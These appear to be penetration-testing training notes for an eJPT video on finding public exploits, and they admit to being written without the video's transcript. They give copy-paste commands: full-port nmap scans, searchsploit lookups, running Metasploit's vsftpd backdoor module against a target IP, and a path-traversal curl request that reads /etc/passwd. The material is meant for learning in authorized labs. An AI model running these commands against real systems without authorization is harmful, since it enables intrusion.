# 01 - Searching For Publicly Available Exploits

Note: The transcript wasn’t provided. The following summary is based on the filename/context and standard eJPT practices. Commands and workflow are conservative, practical defaults you can use in labs or authorized environments.

## What the video covers (Introduction / big picture)
- How to go from service/version discovery to finding known, public exploits.
- Using multiple sources: Exploit-DB (web + searchsploit), Metasploit module search, CVE/NVD, vendor advisories, GitHub.
- Validating exploit applicability (version/OS/arch), reliability, and prerequisites before trying it.
- Building a small, repeatable workflow you can apply after enumeration.

## Flow (ordered)
1. Enumerate services and versions (nmap/banner grabs).
2. Normalize what you found (service name, exact version, OS/cpe).
3. Search for public exploits:
   - searchsploit (local Exploit-DB mirror).
   - Exploit-DB website.
   - Metasploit module search.
   - CVE/NVD and vendor advisories.
   - GitHub PoCs (carefully).
4. Pick candidates and read the PoC/module notes to confirm applicability.
5. Retrieve the PoC (copy/mirror), review usage and dependencies.
6. Test non-destructively first; prefer safer checks where possible.
7. Document the exploit reference (CVE/EDB-ID/URL), steps, and results.

## Tools highlighted
- searchsploit (Kali’s local Exploit-DB search tool)
- Exploit-DB website: https://www.exploit-db.com
- Metasploit Framework (msfconsole)
- NVD (CVE database): https://nvd.nist.gov
- CVE Details: https://www.cvedetails.com
- Vendor advisories/security bulletins
- GitHub (for PoCs): https://github.com
- Google dorks for targeted searching (site:exploit-db.com, site:nvd.nist.gov, etc.)

## Typical command walkthrough (detailed, copy-paste friendly)
The example below shows the common flow after you’ve identified a service/version (replace placeholders in ALL_CAPS with your values). Example services included: Apache httpd 2.4.49 and vsftpd 2.3.4.

- 0) Optional: quick enumeration to extract versions
```
TGT=10.10.10.10
nmap -sV -sC -Pn -p- --min-rate 3000 $TGT
```

- 1) Keep your local exploit database fresh
```
searchsploit -u
```

- 2) Search Exploit-DB locally with searchsploit (use exact service + version terms)
```
# Example: Apache 2.4.49
searchsploit "Apache httpd 2.4.49"
searchsploit -w "Apache httpd 2.4.49"   # show web URLs instead of local paths

# Example: vsftpd 2.3.4
searchsploit "vsftpd 2.3.4"
searchsploit -w "vsftpd 2.3.4"
```

- 3) If you know a CVE, search by CVE
```
# Replace with your CVE
searchsploit CVE-YYYY-NNNNN
```

- 4) Examine an exploit entry before using it
```
# Replace EDB_ID with the Exploit-DB ID you found in searchsploit output
searchsploit -x EDB_ID
```

- 5) Copy the exploit (PoC) to your working directory
```
searchsploit -m EDB_ID
ls -lah          # verify it’s copied locally
sed -n '1,80p' *.py  # read the header/usage of the PoC (adjust file extension)
```

- 6) Corroborate with CVE/NVD and vendor pages (manual check, optional but recommended)
Search URLs (open in browser):
- https://nvd.nist.gov/vuln/search/results?query=SERVICE+VERSION
- https://www.cvedetails.com/vulnerability-search.php?vendor=&product=SERVICE&version=VERSION
- Vendor advisory (e.g., “SERVICE VERSION security advisory”)

- 7) Search Metasploit for modules (built-in)
```
msfconsole -q
# Within msfconsole:
search type:exploit name:vsftpd 2.3.4
# or
search cve:CVE-YYYY-NNNNN

# Example module usage (vsftpd backdoor):
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.10
set RPORT 21
run
```

- 8) If using a downloaded PoC, follow its usage block (example patterns)
```
# Python-based PoC (generic pattern; read the PoC header for exact usage!)
python3 exploit.py --target http://$TGT:80/

# Curl-based quick check (example for traversal-like PoCs; adapt path)
curl -v "http://$TGT:80/../../../../etc/passwd"
```

- 9) Keep notes: version, CVE, EDB-ID, PoC path, exact command that worked, and output.

## Practical tips
- Always match the exact version and context (OS, architecture, module, config). Minor version differences can make/break an exploit.
- Prefer official module/PoC if available (Metasploit/EDB) and read the description, references, and reliability notes.
- Update searchsploit regularly; online sources change.
- Validate PoCs in a controlled lab first. Never run code you don’t understand on client networks without authorization.
- Read PoC headers: usage, required arguments, dependencies, and whether compilation is needed.
- Cross-check with CVE/NVD/vendor advisories to avoid chasing irrelevant or already-patched issues.
- Be mindful of exploit impact (DoS vs RCE). Start with safer checks when possible.
- When search terms are noisy, combine service + version + CVE (if known), or use quotes for exact phrases.

## Minimal cheat sheet (one-screen flow)
- Enumerate
```
nmap -sV -sC -Pn -p- --min-rate 3000 TARGET
```
- Update and search Exploit-DB
```
searchsploit -u
searchsploit "SERVICE VERSION"
searchsploit -w "SERVICE VERSION"
searchsploit CVE-YYYY-NNNNN
```
- Inspect and copy PoC
```
searchsploit -x EDB_ID
searchsploit -m EDB_ID
```
- Metasploit quick search/use
```
msfconsole -q
search type:exploit name:"SERVICE VERSION"
search cve:CVE-YYYY-NNNNN
use MODULE_PATH
set RHOSTS TARGET
set RPORT PORT
run
```
- Verify with CVE/NVD/vendor (manual web check)

## Summary
This video’s topic is the core post-enumeration skill of translating discovered versions into working exploits. The standard eJPT workflow is: enumerate versions, search public sources (searchsploit/Exploit-DB, Metasploit, CVE/NVD, vendor advisories, GitHub), validate applicability, retrieve and review the PoC/module, and execute carefully in a controlled, authorized environment. Keep your process documented, reproducible, and evidence-driven (CVE/EDB references, exact commands, and results).
